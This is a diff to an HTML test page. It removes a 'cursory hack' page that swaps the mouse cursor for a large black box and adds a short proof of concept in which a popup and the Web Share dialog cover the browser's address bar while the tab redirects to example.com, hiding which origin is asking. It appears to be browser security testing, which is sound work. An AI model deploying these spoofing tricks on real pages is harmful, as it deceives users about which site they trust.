@@ -1,183 +1,38 @@
-<html><head>
-    <meta charset="utf-8">
-    <title>cursory hack</title>
-    <style media="screen">
-      body {
-        height:100vh;
-        margin: 0px;
-        background: #fff;
-        display: flex;
-        flex-direction: column;
-        align-items: center;
-        justify-content: center;
-        overflow: hidden;
-      }
-      
-      #fullscreenBtn {
-        position: fixed;
-        top: 50%;
-        left: 50%;
-        transform: translate(-50%, -50%);
-        padding: 15px 30px;
-        font-size: 18px;
-        font-weight: bold;
-        background: #ff0064;
-        color: white;
-        border: 3px solid #ff0064;
-        border-radius: 8px;
-        cursor: pointer;
-        transition: all 0.3s ease;
-        z-index: 1000;
-      }
-      
-      #fullscreenBtn:hover {
-        background: #cc0050;
-        border-color: #cc0050;
-        transform: translate(-50%, -50%) scale(1.05);
-      }
-      
-      /* Mobile cursor box - hidden by default */
-      #mobileCursor {
-        position: fixed;
-        width: 128px;
-        height: 128px;
-        background: rgba(0, 0, 0, 0.95);
-        pointer-events: none;
-        z-index: 999;
-        border-radius: 8px;
-        box-shadow: 0 0 20px rgba(0,0,0,0.5);
-        display: none;
-        transform: translate(-50%, -50%);
-      }
-      
-      #mobileCursor.active {
-        display: block;
-      }
-    </style>
-  </head>
-  <body>
-    <button id="fullscreenBtn">Enter Fullscreen</button>
-    
-    <p style="font-size: 2em; font-weight: bold; text-align: center;">
-      Hello! Move the cursor ....
-    </p>
-    
-    <!-- Mobile cursor box -->
-    <div id="mobileCursor"></div>
-   
-    <script type="text/javascript">
-      var isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
-      
-      // Create larger canvas for bigger cursor (desktop only)
-      var canvas = document.createElement('canvas')
-      canvas.width = canvas.height = 128
+<!doctype html>
+<html>
+<head>
+<style>
+html { font-family: sans-serif; }
+#linkElem {
+  position: absolute;
+  top: 320px;
+  left: calc(50vw - 115px);
+  width: 230px;
+  text-align: center;
+  font-size: 1.5em;
+}
+</style>
+</head>
+<body>
+<h1>Web Share over browser UI, short window</h1>
+<p>Opens popup which receives activation on second click which then shows share UI over address bar/browser UI, makes it seem like background tab is origin since popup origin and window controls are covered</p>
+<a id="linkElem" href="#">Click twice to go to Example.com</a>
+<script>
+linkElem.addEventListener('click', (e) => {
+  e.preventDefault();
+  var topPos = 200 + window.screenTop;
+  var popupWidth = 340;
+  var leftPos = (window.innerWidth / 2) - (popupWidth / 2) + window.screenLeft;
+  window.open(
+    'share-shortwin-popup.html',
+    'test',
+    'width='+popupWidth+',height=340,top='+topPos+',left='+leftPos
+  );
 
-      var ctx = canvas.getContext('2d')
-      ctx.fillStyle = 'rgba(0,0,0,0.95)'
-      ctx.strokeStyle = 'rgba(0,0,0,0.7)'
-
-      var cx, cy, x, y, animation
-      var mobileCursor = document.getElementById('mobileCursor');
-      var cursorActive = false;
-
-      // Desktop: mousemove
-      if (!isMobile) {
-        document.body.addEventListener('mousemove', function(e){
-          cx = e.clientX
-          cy = e.clientY
-          x = cx / window.innerWidth
-          y = cy / window.innerHeight
-
-          if(!animation) animation = requestAnimationFrame(animate)
-        })
-
-        function animate(time){
-          animation = null
-
-          ctx.clearRect(0,0,128,128)
-          ctx.save()
-          
-          // Draw very large black rectangle
-          ctx.fillRect(0, 0, 128, 128);
-          
-          ctx.restore()
-
-          var url = canvas.toDataURL()
-
-          // Position cursor at top (hotspot at 0, 0)
-          document.body.style.cursor = 'url(' + url + ') 0 0, crosshair'
-        }
-      } else {
-        // Mobile: show cursor on first touch/click
-        document.body.style.cursor = 'none';
-        
-        function showMobileCursor(e) {
-          if (!cursorActive) {
-            cursorActive = true;
-            mobileCursor.classList.add('active');
-          }
-          
-          var touch = e.touches ? e.touches[0] : e;
-          mobileCursor.style.left = touch.clientX + 'px';
-          mobileCursor.style.top = touch.clientY + 'px';
-        }
-        
-        // Activate on first click/touch
-        document.body.addEventListener('click', function(e) {
-          if (!cursorActive) {
-            showMobileCursor(e);
-          }
-        });
-        
-        document.body.addEventListener('touchstart', function(e) {
-          showMobileCursor(e);
-        });
-        
-        // Follow touch movement
-        document.body.addEventListener('touchmove', function(e) {
-          if (cursorActive) {
-            var touch = e.touches[0];
-            mobileCursor.style.left = touch.clientX + 'px';
-            mobileCursor.style.top = touch.clientY + 'px';
-          }
-        });
-      }
-
-      // Fullscreen functionality
-      document.getElementById('fullscreenBtn').addEventListener('click', function() {
-        var elem = document.documentElement;
-        
-        if (!document.fullscreenElement) {
-          if (elem.requestFullscreen) {
-            elem.requestFullscreen();
-          } else if (elem.webkitRequestFullscreen) {
-            elem.webkitRequestFullscreen();
-          } else if (elem.msRequestFullscreen) {
-            elem.msRequestFullscreen();
-          }
-          this.textContent = 'Exit Fullscreen';
-        } else {
-          if (document.exitFullscreen) {
-            document.exitFullscreen();
-          } else if (document.webkitExitFullscreen) {
-            document.webkitExitFullscreen();
-          } else if (document.msExitFullscreen) {
-            document.msExitFullscreen();
-          }
-          this.textContent = 'Enter Fullscreen';
-        }
-      });
-
-      document.addEventListener('fullscreenchange', function() {
-        var btn = document.getElementById('fullscreenBtn');
-        if (document.fullscreenElement) {
-          btn.textContent = 'Exit Fullscreen';
-        } else {
-          btn.textContent = 'Enter Fullscreen';
-        }
-      });
-
-    </script>
-  
-
-</body></html>
+  setTimeout(() => {
+    window.location = 'https://example.com';
+  }, 100);
+});
+</script>
+</body>
+</html>
